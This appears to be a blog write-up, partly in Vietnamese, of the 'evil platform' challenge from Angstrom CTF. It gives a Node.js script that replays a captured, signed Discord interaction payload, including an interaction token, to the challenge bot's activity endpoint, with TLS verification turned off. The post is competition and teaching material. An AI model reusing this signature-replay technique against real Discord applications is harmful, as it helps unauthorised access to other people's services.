---
layout: post
title:  "Writeup Angstrom CTF"
tags: [writeup]
authors: [1]
---

## evil platform

![](/assets/angstrom1.png)

> I made a [Discord bot](https://discord.com/oauth2/authorize?client_id=1243802014991913034&permissions=0&scope=bot)! It has everything you want: just flags! Well, I also played around with some new features so there's this cool activity display it can do: unfortunately you would need to own the bot to check it out!

> [source](https://files.actf.co/ce5c8b4ff215a2fc38e9fe375b4146b6ed156b41d25c293992fee898290aa635/index.ts) and [backup bot](https://discord.com/oauth2/authorize?client_id=1244311425246302339&permissions=0&scope=bot)

> Author: paper

> Hint: You should be able to guess the URL which hosts the activity by looking at inspect element for default activities.

Đề bài cho 1 con bot Discord và bảo xem phần activity, tuy nhiên phần activity tác giả thiết kế bị lỗi nên player không xem được, vì vậy ta vào Discord và kiểm tra một activity khác.

```javascript
let request = require('request-promise');

let data = {
  msg: 'validation success',
  signature: '4707122c4f76ea409f2085ccf191d57d7eb29c8ed31ca1910246be3300e279fffa306f50fb747866123dbc923085d18d19c13b83086e06f48243f76f5f8aec0f',
  timestamp: '1716659867',
  body: '{"app_permissions":"311296","application_id":"1243802014991913034","authorizing_integration_owners":{"0":"686027739966341154"},"channel":{"flags":0,"guild_id":"686027739966341154","icon_emoji":{"id":null,"name":"🌐"},"id":"686245017265766431","last_message_id":"1243986377255682058","last_pin_timestamp":"2021-05-27T21:28:37+00:00","name":"general","nsfw":false,"parent_id":"686029342681071810","permissions":"1125899906842623","position":8,"rate_limit_per_user":0,"theme_color":null,"topic":null,"type":0},"channel_id":"686245017265766431","context":0,"data":{"id":"1243807908458664067","name":"flag","type":1},"entitlement_sku_ids":[],"entitlements":[],"guild":{"features":["COMMUNITY_EXP_MEDIUM","COMMUNITY","AUTO_MODERATION","NEWS","CHANNEL_ICON_EMOJIS_GENERATED","THREADS_ENABLED"],"id":"686027739966341154","locale":"en-US"},"guild_id":"686027739966341154","guild_locale":"en-US","id":"1243986387712344244","locale":"en-US","member":{"avatar":null,"communication_disabled_until":null,"deaf":false,"flags":0,"joined_at":"2021-04-02T01:14:22.678000+00:00","mute":false,"nick":"paper","pending":false,"permissions":"1125899906842623","premium_since":null,"roles":["686028267475697666","686028192737525861","686237076806828103","969698895355580458","686028235183620152"],"unusual_dm_activity_until":null,"user":{"avatar":"d95c3567651a0ce43a927e739a51bf13","avatar_decoration_data":null,"clan":null,"discriminator":"0","global_name":"A5rocks","id":"302968847353249813","public_flags":0,"username":"a5rocks"}},"token":"aW50ZXJhY3Rpb246MTI0Mzk4NjM4NzcxMjM0NDI0NDpJZTBhb1NFVk1FTk5PcUVsdzN5SlRXamwxV3RobzA4SWR2clJpYTV6bGF6T04xQkp1VTlWVjE2eFlmaDIwczRUZGtBeUF3Q0VqYjE5OFVhRzEwUWl1VDBSSVNBNHRHbVVGVWZUVmVOTWVDVFhQc014dDdWOHJ0WVIzR1RMRE5mNQ","type":2,"version":1}'
}

async function run() {
    let resp = await request.post('https://1243802014991913034.discordsays.com/interact', {
        headers: {
            'X-Signature-Ed25519': data.signature,
            'X-Signature-Timestamp': data.timestamp,
            "content-type": "application/json",
        },
        body: data.body,
        // proxy: 'http://localhost:8080',
        strictSSL: false
    });
    console.log(resp);
};

run();
```